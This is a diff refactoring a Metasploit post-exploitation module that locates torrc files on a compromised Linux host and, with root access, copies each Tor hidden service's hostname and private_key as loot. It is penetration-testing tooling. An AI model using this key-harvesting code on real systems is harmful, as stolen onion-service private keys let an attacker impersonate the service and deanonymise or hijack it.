@@ -28,7 +28,12 @@ class MetasploitModule < Msf::Post
           'Harvey Phillips <xcellerator[at]gmx.com>',
         ],
         'Platform' => ['linux'],
-        'SessionTypes' => ['shell', 'meterpreter']
+        'SessionTypes' => ['shell', 'meterpreter'],
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [],
+          'Reliability' => []
+        }
       )
     )
   end
@@ -56,41 +61,42 @@ class MetasploitModule < Msf::Post
     config = cmd_exec("locate 'torrc' | grep -v 'torrc.5.gz'").split("\n")
     if config.empty?
       print_error('No torrc file found, maybe it goes by a different name?')
-    else
-      hidden = Array.new
-      # For every torrc file found, parse them for HiddenServiceDir
-      config.each do |c|
-        print_good("Torrc file found at #{c}")
-        services = cmd_exec("cat #{c} | grep HiddenServiceDir | grep -v '#' | cut -d ' ' -f 2").split("\n")
-        # For each HiddenServiceDir found in the torrc(s), push them to the hidden array
-        services.each do |s|
-          hidden.push(s)
-        end
-      end
-      # Remove any duplicate entries
-      hidden = hidden.uniq
-      # If hidden is empty, then no Hidden Services are running.
-      if !hidden.empty?
-        print_good("#{hidden.length} hidden services have been found!")
-      else
-        print_bad('No hidden services were found!')
-      end
+      return
+    end
 
-      if is_root?
-        # For all the Hidden Services found, loot hostname file
-        hidden.each do |f|
-          output = read_file("#{f}hostname")
-          save(f, output, "tor.#{f.split('/')[-1]}.hostname") if output && output !~ /No such file or directory/
-        end
-
-        # For all the Hidden Services found, loot private_key file
-        hidden.each do |f|
-          output = read_file("#{f}private_key")
-          save(f, output, "tor.#{f.split('/')[-1]}.privatekey") if output && output !~ /No such file or directory/
-        end
-      else
-        print_error('Hidden Services were found, but we need root to access the directories')
+    hidden = Array.new
+    # For every torrc file found, parse them for HiddenServiceDir
+    config.each do |c|
+      print_good("Torrc file found at #{c}")
+      services = cmd_exec("cat #{c} | grep HiddenServiceDir | grep -v '#' | cut -d ' ' -f 2").split("\n")
+      # For each HiddenServiceDir found in the torrc(s), push them to the hidden array
+      services.each do |s|
+        hidden.push(s)
       end
+    end
+
+    # Remove any duplicate entries
+    hidden = hidden.uniq
+
+    # If hidden is empty, then no Hidden Services are running.
+    if hidden.empty?
+      print_bad('No hidden services were found!')
+      return
+    end
+
+    print_good("#{hidden.length} hidden services have been found!")
+
+    unless is_root?
+      print_error('Hidden Services were found, but we need root to access the directories')
+      return
+    end
+
+    # For all the Hidden Services found, loot hostname and private_key file
+    hidden.each do |f|
+      output = read_file("#{f}hostname")
+      save(f, output, "tor.#{f.split('/')[-1]}.hostname") if output && output !~ /No such file or directory/
+      output = read_file("#{f}private_key")
+      save(f, output, "tor.#{f.split('/')[-1]}.privatekey") if output && output !~ /No such file or directory/
     end
   end
 end
